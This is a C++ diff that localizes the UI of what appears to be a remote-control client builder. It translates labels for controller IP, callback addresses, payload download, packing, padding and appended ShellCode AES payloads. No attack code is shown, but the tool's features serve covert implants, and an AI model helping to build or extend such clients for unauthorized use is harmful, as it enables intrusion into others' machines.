@@ -592,6 +592,25 @@ void CBuildDlg::OnBnClickedOk()
 BOOL CBuildDlg::OnInitDialog()
 {
     __super::OnInitDialog();
+    // 多语言翻译 - Static控件
+    SetDlgItemText(IDC_STATIC_OTHER_ITEM, _TR("未选择文件"));
+    SetDlgItemText(IDC_STATIC_PAYLOAD, _TR("载荷类型:"));
+    SetDlgItemText(IDC_STATIC_PAYLOAD2, _TR("安装目录:"));
+    SetDlgItemText(IDC_STATIC_PAYLOAD3, _TR("程序名称:"));
+    SetDlgItemText(IDC_STATIC_DOWNLOAD, _TR("下载地址(默认本机):"));
+    SetDlgItemText(IDC_STATIC_BUILD_SERVICE, _TR("服务程序:"));
+    SetDlgItemText(IDC_STATIC_BUILD_ARCH, _TR("架构:"));
+    SetDlgItemText(IDC_STATIC_BUILD_MODE, _TR("模式:"));
+    SetDlgItemText(IDC_STATIC_BUILD_HOST_IP, _TR("主控IP地址:"));
+    SetDlgItemText(IDC_STATIC_BUILD_PROTOCOL, _TR("协议:"));
+    SetDlgItemText(IDC_STATIC_BUILD_ENCRYPT, _TR("加密:"));
+    SetDlgItemText(IDC_STATIC_BUILD_GROUP, _TR("分组名称:"));
+    SetDlgItemText(IDC_STATIC_BUILD_Port_2355, _TR("Port:"));
+    SetDlgItemText(IDC_STATIC_BUILD_PACK, _TR("加壳:"));
+    SetDlgItemText(IDC_STATIC_BUILD_TIP, _TR("提示: 多个上线地址用分号分隔，99个字符以内。仅供学习和自用，严禁用于非法目的使用。"));
+    SetDlgItemText(IDC_STATIC_BUILD_PADDING, _TR("程序增肥:"));
+    SetDlgItemText(IDC_STATIC_BUILD_GENERAL, _TR("通用"));
+    SetDlgItemText(IDC_STATIC_BUILD_ADVANCED, _TR("高级 (非必填项)"));
 
     // 设置对话框标题和控件文本（解决英语系统乱码问题）
     SetWindowText(_TR("生成服务端"));
@@ -767,8 +786,8 @@ void CBuildDlg::OnClientRunasAdmin()
     static bool warned = false;
     if (m_runasAdmin && !warned) {
         warned = true;
-        MessageBoxL("安装Windows服务必须设置，客户端运行时会请求管理员权限，可能会触发系统UAC提示。\n"
-                    "如果未设置，则程序会以当前用户的权限运行，通常也能安装成功。", "提示", MB_ICONINFORMATION);
+        MessageBoxL(_L("安装Windows服务必须设置，客户端运行时会请求管理员权限，可能会触发系统UAC提示。\n")+
+                    _L("如果未设置，则程序会以当前用户的权限运行，通常也能安装成功。"), "提示", MB_ICONINFORMATION);
     }
 }
 
@@ -786,8 +805,8 @@ void CBuildDlg::OnCbnSelchangeComboCompress()
     static bool warned = false;
     if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES && !warned) {
         warned = true;
-        MessageBoxL(_T("使用 ShellCode AES 在程序尾部追加载荷，可能无法在某些服务器系统运行! "
-                       "请自行验证。或者选择其他载荷，或者切换为 ShellCode AES Old 模式生成!"),
+        MessageBoxL(_L("使用 ShellCode AES 在程序尾部追加载荷，可能无法在某些服务器系统运行! ")+
+                       _L("请自行验证。或者选择其他载荷，或者切换为 ShellCode AES Old 模式生成!"),
                        "提示", MB_ICONWARNING);
     }
 }
@@ -879,10 +898,10 @@ void CBuildDlg::OnEnKillfocusEditInstallDir()
     if (strText.IsEmpty()) return;
 
     if (!IsValidFileName(strText)) {
-        MessageBoxL(_T("文件名不合法，请检查：\n")
-                    _T("1. 不能包含 \\ / : * ? \" < > |\n")
-                    _T("2. 不能是系统保留名称 (CON, PRN 等)\n")
-                    _T("3. 不能以空格或点结尾"), "提示", MB_ICONWARNING);
+        MessageBoxL(_L("文件名不合法，请检查：\n")+
+                    _L("1. 不能包含 \\ / : * ? \" < > |\n")+
+                    _L("2. 不能是系统保留名称 (CON, PRN 等)\n")+
+                    _L("3. 不能以空格或点结尾"), "提示", MB_ICONWARNING);
 
         GetDlgItem(IDC_EDIT_INSTALL_DIR)->SetFocus();
         ((CEdit*)GetDlgItem(IDC_EDIT_INSTALL_DIR))->SetWindowTextA("");
@@ -899,10 +918,10 @@ void CBuildDlg::OnEnKillfocusEditInstallName()
     if (strText.IsEmpty()) return;
 
     if (!IsValidFileName(strText)) {
-        MessageBoxL(_T("文件名不合法，请检查：\n")
-                    _T("1. 不能包含 \\ / : * ? \" < > |\n")
-                    _T("2. 不能是系统保留名称 (CON, PRN 等)\n")
-                    _T("3. 不能以空格或点结尾"), "提示", MB_ICONWARNING);
+        MessageBoxL(_L("文件名不合法，请检查：\n")+
+                    _L("1. 不能包含 \\ / : * ? \" < > |\n")+
+                    _L("2. 不能是系统保留名称 (CON, PRN 等)\n")+
+                    _L("3. 不能以空格或点结尾"), "提示", MB_ICONWARNING);
 
         GetDlgItem(IDC_EDIT_INSTALL_NAME)->SetFocus();
         ((CEdit*)GetDlgItem(IDC_EDIT_INSTALL_NAME))->SetWindowTextA("");
@@ -930,9 +949,9 @@ void CBuildDlg::OnBnClickedCheckFileserver()
     static bool warned = false;
     if (!warned && checked) {
         warned = true;
-        MessageBoxL("请提供载荷的下载地址。下载地址前缀为 http 或 https。"
-                    "默认由本机提供载荷下载服务，请将载荷文件放在\"Payloads\"目录。"
-                    "由本机提供下载时，下载地址可以省略输入。", "提示", MB_ICONINFORMATION);
+        MessageBoxL(_L("请提供载荷的下载地址。下载地址前缀为 http 或 https。")+
+                    _L("默认由本机提供载荷下载服务，请将载荷文件放在\"Payloads\"目录。")+
+                    _L("由本机提供下载时，下载地址可以省略输入。"), "提示", MB_ICONINFORMATION);
     }
 }
 
